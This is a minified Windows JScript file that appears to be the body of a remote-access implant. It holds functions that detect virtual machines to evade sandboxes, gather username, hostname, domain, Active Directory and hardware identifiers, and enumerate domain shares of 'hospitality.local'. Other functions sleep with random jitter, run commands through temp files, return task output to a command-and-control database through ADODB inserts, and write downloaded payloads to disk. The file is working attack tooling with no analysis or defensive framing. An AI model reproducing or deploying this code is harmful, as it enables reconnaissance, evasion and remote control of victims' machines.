function listRunningProcesses(){var output = "";var root = GetObject("winmgmts:");var colItems = root.ExecQuery("select * from Win32_Process");var enumItems = new Enumerator(colItems);for (; !enumItems.atEnd(); enumItems.moveNext()){var objItem = enumItems.item();output += "\n" + objItem.Name;}return output;}function netShareDiscovery(){var shell = WScript.CreateObject("WScript.Shell");try{var shellExecObj = shell.exec("cmd.exe /c net view /domain hospitality.local 2>&1");var output = shellExecObj.StdOut.ReadAll();} catch(e) {var output = "Error: " + e;}return output;}function isVm(){var root = GetObject("winmgmts:");var biosRequest = root.ExecQuery("Select * From Win32_BIOS");var biosItems = new Enumerator(biosRequest);for (; !biosItems.atEnd(); biosItems.moveNext()){var bios_version = biosItems.item().SMBIOSBIOSVersion.toLowerCase();var serial_number = biosItems.item().SerialNumber.toLowerCase();if(serial_number.indexOf('parallels') >= 0 || serial_number.indexOf('vmware') >= 0) {return true;}if(bios_version.indexOf('vmware') >= 0 || bios_version.indexOf('virtualbox') >= 0) {return true;}}return false;}function getADInformation(){try {var adobj = new ActiveXObject('ADSystemInfo');return adobj.ComputerName;} catch(e) {return false;}}function getEnvVar(name){var shell = WScript.CreateObject("WScript.Shell");return shell.ExpandEnvironmentStrings(name);}function getSysInfo(){var result = [];var root = GetObject("winmgmts:");try{result.push('username***' + getEnvVar('%USERNAME%'));result.push('hostname***' + getEnvVar('%COMPUTERNAME%'));var ad = getADInformation();if(ad){result.push('adinformation***' + ad);} else {result.push('adinformation***no_ad');}var csRequest = root.ExecQuery('Select * From Win32_ComputerSystem');var csItems = new Enumerator(csRequest);for(; !csItems.atEnd(); csItems.moveNext()) {if(csItems.item().PartOfDomain){result.push('part_of_domain***yes');} else {result.push('part_of_domain***no');}result.push('pc_domain***' + csItems.item().Domain);result.push('pc_dns_host_name***' + csItems.item().DNSHostName);result.push('pc_model***' + csItems.item().Model);}} catch (e){result.push('error0***code_error');}try{var osRequest = root.ExecQuery('Select * From Win32_OperatingSystem');var osItems = new Enumerator(osRequest);for(; !osItems.atEnd(); osItems.moveNext()) {if(osItems.item().OSArchitecture){result.push('os_architecture***' + osItems.item().OSArchitecture);}if(osItems.item().Version){result.push('os_version***' + osItems.item().Version);}}} catch (e){result.push('error1***code_error');}return(result);}function getSysInfoDiscovery(){output = "is_vm: " + isVm() + "\n";output += getSysInfo();return output;}function getMacSerial(){var root = GetObject("winmgmts:");var mac = root.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True");var mac_address = "",serial = "";for (var items = new Enumerator(mac); !items.atEnd(); items.moveNext()) {var item = items.item();if (typeof item.MACAddress == "string"){mac_address = item.MACAddress.replace(/:/g, '');break;}}var lc = root.ExecQuery("Select * from Win32_LogicalDisk");for (var items = new Enumerator(lc); !items.atEnd(); items.moveNext()) {var item = items.item();if (typeof item.VolumeSerialNumber == "string"){serial = item.VolumeSerialNumber;break;}}var ret = mac_address + serial;ret = ret.substr(0, 21);return(ret);}function sleep(){min = 1;max = 3;jitter = Math.round(Math.random()*(max-min)+min);sleepInterval = 500*3*jitter;WScript.Sleep(sleepInterval);}function getRandomFile(){var fileObject = new ActiveXObject("Scripting.FileSystemObject");randomFile = fileObject.GetSpecialFolder(2) + "\\" + fileObject.GetTempName();return randomFile;}function getCommandOutput(randomFile){var fileObject = new ActiveXObject("Scripting.FileSystemObject");fileOutput = fileObject.OpenTextFile(randomFile);cmdOutput = fileOutput.ReadAll();fileOutput.Close();fileObject.DeleteFile(randomFile);return cmdOutput;}function sendTaskOutput(dbo, output, idStr){var responseCmd = new ActiveXObject("ADODB.Command");responseCmd.CommandText = "INSERT INTO Responses (response, request_id) VALUES (?, " + idStr + ")";responseCmd.Parameters.Append(responseCmd.CreateParameter("Command", 129, 1, output.length + 1, output));responseCmd.ActiveConnection = dbo;responseCmd.Execute();}function downloadFile(fileDestination, fileBlob) {var Stream = WScript.CreateObject('ADODB.Stream');Stream.Open();Stream.Type = 1;Stream.Write(fileBlob);Stream.Position = 0;   var File = WScript.CreateObject('Scripting.FileSystemObject');if (File.FileExists(fileDestination)){File.DeleteFile(fileDestination);}Stream.SaveToFile(fileDestination, 2);Stream.Close();}